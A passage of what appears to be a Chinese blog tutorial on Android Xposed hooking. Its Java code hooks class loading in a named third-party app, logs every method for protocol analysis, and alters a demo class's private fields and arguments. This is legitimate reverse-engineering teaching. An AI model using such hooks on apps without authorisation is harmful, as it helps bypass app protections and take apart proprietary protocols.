classes;<br>                    &#125;<br>                &#125;<br>            &#125;<br> &#125; <span class="hljs-keyword">catch</span> (NoSuchFieldException | IllegalAccessException | InvocationTargetException e) &#123;<br>        e.printStackTrace();<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> String[<span class="hljs-number">0</span>];<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="4-Hook所有方法"><a href="#4-Hook所有方法" class="headerlink" title="4. Hook所有方法"></a>4. Hook所有方法</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.xposed.enumeratorClassHook;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.lang.reflect.Modifier;<br><br><span class="hljs-keyword">import</span> de.robv.android.xposed.IXposedHookLoadPackage;<br><span class="hljs-keyword">import</span> de.robv.android.xposed.XC_MethodHook;<br><span class="hljs-keyword">import</span> de.robv.android.xposed.XC_MethodHook.MethodHookParam;<br><span class="hljs-keyword">import</span> de.robv.android.xposed.XposedBridge;<br><span class="hljs-keyword">import</span> de.robv.android.xposed.XposedHelpers;<br><span class="hljs-keyword">import</span> de.robv.android.xposed.callbacks.XC_LoadPackage.LoadPackageParam;<br><span class="hljs-keyword">import</span> <span class="hljs-keyword">static</span> de.robv.android.xposed.XposedHelpers.findAndHookMethod;<br><br><span class="hljs-comment">// 自定义的回调函数接口</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Module</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">IXposedHookLoadPackage</span> </span>&#123;<br><br>    <span class="hljs-keyword">static</span> String strClassName = <span class="hljs-string">&quot;&quot;</span>;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">handleLoadPackage</span><span class="hljs-params">(LoadPackageParam lpparam)</span> <span class="hljs-keyword">throws</span> Throwable </span>&#123;<br><br>        <span class="hljs-comment">// 被Hook操作的目标Android应用的包名，进行Hook操作的过滤</span><br>        String strPackageName = <span class="hljs-string">&quot;com.guji.loveparty&quot;</span>;<br>        <span class="hljs-keyword">if</span> (lpparam.packageName.equals(strPackageName)) &#123;<br><br>            XposedBridge.log(<span class="hljs-string">&quot;Loaded App:&quot;</span> + lpparam.packageName);<br>  findAndHookMethod(ClassLoader.class, <span class="hljs-string">&quot;loadClass&quot;</span>, String.class, <span class="hljs-keyword">new</span> XC_MethodHook() &#123;<br><br>                <span class="hljs-comment">// 在类方法loadClass执行之后执行的代码</span><br>                <span class="hljs-meta">@Override</span><br>                <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">afterHookedMethod</span><span class="hljs-params">(MethodHookParam param)</span> <span class="hljs-keyword">throws</span> Throwable </span>&#123;<br><br>                    <span class="hljs-comment">// 参数的检查</span><br>                    <span class="hljs-keyword">if</span> (param.hasThrowable()) &#123;<br>                        <span class="hljs-keyword">return</span>;<br>                    &#125;<br><br>                    <span class="hljs-comment">// 获取指定名称的类加载之后的Class&lt;?&gt;</span><br>                    Class&lt;?&gt; clazz = (Class&lt;?&gt;) param.getResult();<br>                    <span class="hljs-comment">// 获取加载的指定类的名称</span><br>                    String strClazz = clazz.getName();<br>                    XposedBridge.log(<span class="hljs-string">&quot;LoadClass : &quot;</span>+strClazz);<br>                    <span class="hljs-comment">// 所有的类都是通过loadClass方法加载的</span><br>                    <span class="hljs-comment">// 过滤掉Android系统的类以及一些常见的java类库</span><br>                    <span class="hljs-keyword">if</span> (!strClazz.startsWith(<span class="hljs-string">&quot;android.&quot;</span>) <br>                        &amp;&amp; !strClazz.startsWith(<span class="hljs-string">&quot;.system&quot;</span>)<br>                        &amp;&amp; !strClazz.startsWith(<span class="hljs-string">&quot;java.&quot;</span>) <br>                        &amp;&amp; !strClazz.startsWith(<span class="hljs-string">&quot;org.&quot;</span>) <br>                        &amp;&amp; !strClazz.contains(<span class="hljs-string">&quot;umeng.&quot;</span>)<br>                        &amp;&amp; !strClazz.contains(<span class="hljs-string">&quot;com.google&quot;</span>)<br>                        &amp;&amp; !strClazz.contains(<span class="hljs-string">&quot;.alipay&quot;</span>)<br>                        &amp;&amp; !strClazz.contains(<span class="hljs-string">&quot;.netease&quot;</span>)<br>                        &amp;&amp; !strClazz.contains(<span class="hljs-string">&quot;.alibaba&quot;</span>)<br>                        &amp;&amp; !strClazz.contains(<span class="hljs-string">&quot;.pgyersdk&quot;</span>)<br>                        &amp;&amp; !strClazz.contains(<span class="hljs-string">&quot;.daohen&quot;</span>)<br>                        &amp;&amp; !strClazz.contains(<span class="hljs-string">&quot;.bugly&quot;</span>)<br>                        &amp;&amp; !strClazz.contains(<span class="hljs-string">&quot;mini&quot;</span>)<br>                        &amp;&amp; !strClazz.contains(<span class="hljs-string">&quot;xposed&quot;</span>)) &#123;<br>                        <span class="hljs-comment">// 或者只Hook加密算法类、网络数据传输类、按钮事件类等协议分析的重要类</span><br><br>                        <span class="hljs-comment">// 同步处理一下</span><br>                        <span class="hljs-keyword">synchronized</span> (<span class="hljs-keyword">this</span>.getClass()) &#123;<br><br>                            <span class="hljs-comment">// 获取被Hook的目标类的名称</span><br>                            strClassName = strClazz;<br>                            <span class="hljs-comment">//XposedBridge.log(&quot;HookedClass : &quot;+strClazz);</span><br>                            <span class="hljs-comment">// 获取到指定名称类声明的所有方法的信息</span><br>                            Method[] m = clazz.getDeclaredMethods();<br>                            <span class="hljs-comment">// 打印获取到的所有的类方法的信息</span><br>                            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; m.length; i++) &#123;<br><br>  <span class="hljs-comment">// 过滤掉指定名称类中声明的抽象方法</span><br>                                <span class="hljs-keyword">if</span> (!Modifier.isAbstract(m[i].getModifiers())  <br>                                    <span class="hljs-comment">// 过滤掉指定名称类中声明的Native方法</span><br>                                     &amp;&amp; !Modifier.isNative(m[i].getModifiers())  <br>                                    <span class="hljs-comment">// 过滤掉指定名称类中声明的接口方法</span><br>                                     &amp;&amp; !Modifier.isInterface(m[i].getModifiers())  <br>                                     ) &#123;<br><br>                                    <span class="hljs-comment">// 对指定名称类中声明的非抽象方法进行java Hook处理</span><br>                                    XposedBridge.hookMethod(m[i], <span class="hljs-keyword">new</span> XC_MethodHook() &#123;<br><br>                                        <span class="hljs-comment">// 被java Hook的类方法执行完毕之后，打印log日志</span><br>                                        <span class="hljs-meta">@Override</span><br>              <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">afterHookedMethod</span><span class="hljs-params">(MethodHookParam param)</span> <span class="hljs-keyword">throws</span> Throwable </span>&#123;<br><br>                                            <span class="hljs-comment">// 打印被java Hook的类方法的名称和参数类型等信息</span><br> XposedBridge.log(<span class="hljs-string">&quot;HOOKED METHOD: &quot;</span>+strClassName+<span class="hljs-string">&quot;-&quot;</span>+param.method.toString());<br>                                        &#125;<br>                                    &#125;);<br>                                &#125;<br>                            &#125;<br>                        &#125;<br><br>                    &#125;<br>                &#125;<br>            &#125;);<br>        &#125;<br><br>    &#125;<br><br>    <span class="hljs-comment">// 获取指定名称的类声明的类成员变量、类方法、内部类的信息</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">dumpClass</span><span class="hljs-params">(Class&lt;?&gt; actions)</span> </span>&#123;<br><br>        XposedBridge.log(<span class="hljs-string">&quot;Dump class &quot;</span> + actions.getName());<br>        XposedBridge.log(<span class="hljs-string">&quot;Methods&quot;</span>);<br><br>        <span class="hljs-comment">// 获取到指定名称类声明的所有方法的信息</span><br>        Method[] m = actions.getDeclaredMethods();<br>        <span class="hljs-comment">// 打印获取到的所有的类方法的信息</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; m.length; i++) &#123;<br><br>            XposedBridge.log(m[i].toString());<br>        &#125;<br><br>        XposedBridge.log(<span class="hljs-string">&quot;Fields&quot;</span>);<br>        <span class="hljs-comment">// 获取到指定名称类声明的所有变量的信息</span><br>        Field[] f = actions.getDeclaredFields();<br>        <span class="hljs-comment">// 打印获取到的所有变量的信息</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; f.length; j++) &#123;<br><br>            XposedBridge.log(f[j].toString());<br>        &#125;<br><br>        XposedBridge.log(<span class="hljs-string">&quot;Classes&quot;</span>);<br>        <span class="hljs-comment">// 获取到指定名称类中声明的所有内部类的信息</span><br>        Class&lt;?&gt;[] c = actions.getDeclaredClasses();<br>        <span class="hljs-comment">// 打印获取到的所有内部类的信息</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> k = <span class="hljs-number">0</span>; k &lt; c.length; k++) &#123;<br><br>            XposedBridge.log(c[k].toString());<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="5、XposedHook程序源码"><a href="#5、XposedHook程序源码" class="headerlink" title="5、XposedHook程序源码"></a>5、XposedHook程序源码</h2><p>HookDemo.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">abstract</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Animal</span></span>&#123;<br>    <span class="hljs-keyword">int</span> anonymoutInt = <span class="hljs-number">500</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">void</span> <span class="hljs-title">eatFunc</span><span class="hljs-params">(String value)</span></span>;<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HookDemo</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> String Tag = <span class="hljs-string">&quot;HookDemo&quot;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span>  <span class="hljs-keyword">int</span> staticInt = <span class="hljs-number">100</span>;<br>    <span class="hljs-keyword">public</span>  <span class="hljs-keyword">int</span> publicInt = <span class="hljs-number">200</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> privateInt = <span class="hljs-number">300</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">HookDemo</span><span class="hljs-params">()</span></span>&#123;<br>        <span class="hljs-keyword">this</span>(<span class="hljs-string">&quot;NOHook&quot;</span>);<br>        Log.d(Tag, <span class="hljs-string">&quot;HookDemo() was called|||&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-title">HookDemo</span><span class="hljs-params">(String str)</span></span>&#123;<br>        Log.d(Tag, <span class="hljs-string">&quot;HookDemo(String str) was called|||&quot;</span> + str);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">hookDemoTest</span><span class="hljs-params">()</span></span>&#123;<br>        Log.d(Tag, <span class="hljs-string">&quot;staticInt = &quot;</span> + staticInt);<br>        Log.d(Tag, <span class="hljs-string">&quot;PublicInt = &quot;</span> + publicInt);<br>        Log.d(Tag, <span class="hljs-string">&quot;privateInt = &quot;</span> + privateInt);<br>        publicFunc(<span class="hljs-string">&quot;NOHook&quot;</span>);<br>        Log.d(Tag, <span class="hljs-string">&quot;PublicInt = &quot;</span> + publicInt);<br>        Log.d(Tag, <span class="hljs-string">&quot;privateInt = &quot;</span> + privateInt);<br>        privateFunc(<span class="hljs-string">&quot;NOHook&quot;</span>);<br>        staticPrivateFunc(<span class="hljs-string">&quot;NOHook&quot;</span>);<br><br>        String[][] str = <span class="hljs-keyword">new</span> String[<span class="hljs-number">1</span>][<span class="hljs-number">2</span>];<br>        Map map = <span class="hljs-keyword">new</span> HashMap&lt;String, String&gt;();<br>        map.put(<span class="hljs-string">&quot;key&quot;</span>, <span class="hljs-string">&quot;value&quot;</span>);<br>        ArrayList arrayList = <span class="hljs-keyword">new</span> ArrayList();<br>        arrayList.add(<span class="hljs-string">&quot;listValue&quot;</span>);<br>        complexParameterFunc(<span class="hljs-string">&quot;NOHook&quot;</span>, str, map, arrayList);<br><br>        repleaceFunc();<br>        anonymousInner(<span class="hljs-keyword">new</span> Animal() &#123;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">eatFunc</span><span class="hljs-params">(String value)</span> </span>&#123;<br>                Log.d(Tag, <span class="hljs-string">&quot;eatFunc(String value)  was called|||&quot;</span> + value);<br>                Log.d(Tag, <span class="hljs-string">&quot;anonymoutInt =  &quot;</span> + anonymoutInt);<br>            &#125;<br>        &#125;, <span class="hljs-string">&quot;NOHook&quot;</span>);<br><br>        InnerClass innerClass = <span class="hljs-keyword">new</span> InnerClass();<br>        innerClass.InnerFunc(<span class="hljs-string">&quot;NOHook&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">publicFunc</span><span class="hljs-params">(String value)</span></span>&#123;<br>        Log.d(Tag, <span class="hljs-string">&quot;publicFunc(String value) was called|||&quot;</span> + value);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">privateFunc</span><span class="hljs-params">(String value)</span></span>&#123;<br>        Log.d(Tag, <span class="hljs-string">&quot;privateFunc(String value) was called|||&quot;</span> + value);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">staticPrivateFunc</span><span class="hljs-params">(String value)</span></span>&#123;<br>        Log.d(<span class="hljs-string">&quot;HookDemo&quot;</span>, <span class="hljs-string">&quot;staticPrivateFunc(Strin value) was called|||&quot;</span> + value);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">complexParameterFunc</span><span class="hljs-params">(String value, String[][] str, Map&lt;String,String&gt; map, ArrayList arrayList)</span></span><br><span class="hljs-function">    </span>&#123;<br>        Log.d(<span class="hljs-string">&quot;HookDemo&quot;</span>, <span class="hljs-string">&quot;complexParameter(Strin value) was called|||&quot;</span> + value);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">repleaceFunc</span><span class="hljs-params">()</span></span>&#123;<br>        Log.d(Tag, <span class="hljs-string">&quot;repleaceFunc will be replace|||&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">anonymousInner</span><span class="hljs-params">(Animal dog, String value)</span></span>&#123;<br>        Log.d(Tag, <span class="hljs-string">&quot;anonymousInner was called|||&quot;</span> + value);<br>        dog.eatFunc(<span class="hljs-string">&quot;NOHook&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">hideFunc</span><span class="hljs-params">(String value)</span></span>&#123;<br>        Log.d(Tag, <span class="hljs-string">&quot;hideFunc was called|||&quot;</span> + value);<br>    &#125;<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">InnerClass</span></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> innerPublicInt = <span class="hljs-number">10</span>;<br>        <span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> innerPrivateInt = <span class="hljs-number">20</span>;<br>        <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">InnerClass</span><span class="hljs-params">()</span></span>&#123;<br>            Log.d(Tag, <span class="hljs-string">&quot;InnerClass constructed func was called&quot;</span>);<br>        &#125;<br>        <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">InnerFunc</span><span class="hljs-params">(String value)</span></span>&#123;<br>            Log.d(Tag, <span class="hljs-string">&quot;InnerFunc(String value) was called|||&quot;</span> + value);<br>            Log.d(Tag, <span class="hljs-string">&quot;innerPublicInt = &quot;</span> + innerPublicInt);<br>            Log.d(Tag, <span class="hljs-string">&quot;innerPrivateInt = &quot;</span> + innerPrivateInt);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">XposedHook</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">IXposedHookLoadPackage</span> </span>&#123;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">handleLoadPackage</span><span class="hljs-params">(XC_LoadPackage.LoadPackageParam loadPackageParam)</span> <span class="hljs-keyword">throws</span> Throwable </span>&#123;<br>        <span class="hljs-keyword">if</span> (loadPackageParam.packageName.equals(<span class="hljs-string">&quot;com.example.xposedhooktarget&quot;</span>)) &#123;<br>            <span class="hljs-keyword">final</span> Class&lt;?&gt; clazz = XposedHelpers.findClass(<span class="hljs-string">&quot;com.example.xposedhooktarget.HookDemo&quot;</span>, loadPackageParam.classLoader);<br>            <span class="hljs-comment">//getClassInfo(clazz);</span><br><br>            <span class="hljs-comment">//不需要获取类对象，即可直接修改类中的私有静态变量staticInt</span><br>            XposedHelpers.setStaticIntField(clazz, <span class="hljs-string">&quot;staticInt&quot;</span>, <span class="hljs-number">99</span>);<br><br>            <span class="hljs-comment">//Hook无参构造函数，啥也不干。。。。</span><br>            XposedHelpers.findAndHookConstructor(clazz, <span class="hljs-keyword">new</span> XC_MethodHook() &#123;<br>                <span class="hljs-meta">@Override</span><br>                <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">beforeHookedMethod</span><span class="hljs-params">(MethodHookParam param)</span> <span class="hljs-keyword">throws</span> Throwable </span>&#123;<br>                    XposedBridge.log(<span class="hljs-string">&quot;Haha, HookDemo constructed was hooked&quot;</span> );<br>                    <span class="hljs-comment">//大坑，此时对象还没有建立，即不能获取对象，也不能修改非静态变量的值</span><br>                    <span class="hljs-comment">//XposedHelpers.setIntField(param.thisObject, &quot;publicInt&quot;, 199);</span><br>                    <span class="hljs-comment">//XposedHelpers.setIntField(param.thisObject, &quot;privateInt&quot;, 299);</span><br>                &#125;<br>            &#125;);<br><br>            <span class="hljs-comment">//Hook有参构造函数，修改参数</span><br>            XposedHelpers.findAndHookConstructor(clazz, String.class,  <span class="hljs-keyword">new</span> XC_MethodHook() &#123;<br>                <span class="hljs-meta">@Override</span><br>                <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">beforeHookedMethod</span><span class="hljs-params">(MethodHookParam param)</span> <span class="hljs-keyword">throws</span> Throwable </span>&#123;<br>                    param.args[<span class="hljs-number">0</span>] = <span class="hljs-string">&quot;Haha, HookDemo(str) are hooked&quot;</span>;<br>                &#125;<br>            &#125;);<br><br>            <span class="hljs-comment">//Hook有参构造函数，修改参数------不能使用XC_MethodReplacement()替换构造函数内容，</span><br>            <span class="hljs-comment">//XposedHelpers.findAndHookConstructor(clazz, String.class, new XC_MethodReplacement() &#123;</span><br>            <span class="hljs-comment">//    @Override</span><br>            <span class="hljs-comment">//    protected Object replaceHookedMethod(MethodHookParam methodHookParam) throws Throwable &#123;</span><br>            <span class="hljs-comment">//        Log.d(&quot;HookDemo&quot; , &quot;HookDemo(str) was replace&quot;);</span><br>            <span class="hljs-comment">//    &#125;</span><br>            <span class="hljs-comment">//&#125;);</span><br><br>            <span class="hljs-comment">//Hook公有方法publicFunc，</span><br>            <span class="hljs-comment">// 1、修改参数</span><br>            <span class="hljs-comment">// 2、修改下publicInt和privateInt的值</span><br>            <span class="hljs-comment">// 3、再顺便调用一下隐藏函数hideFunc</span><br>            <span 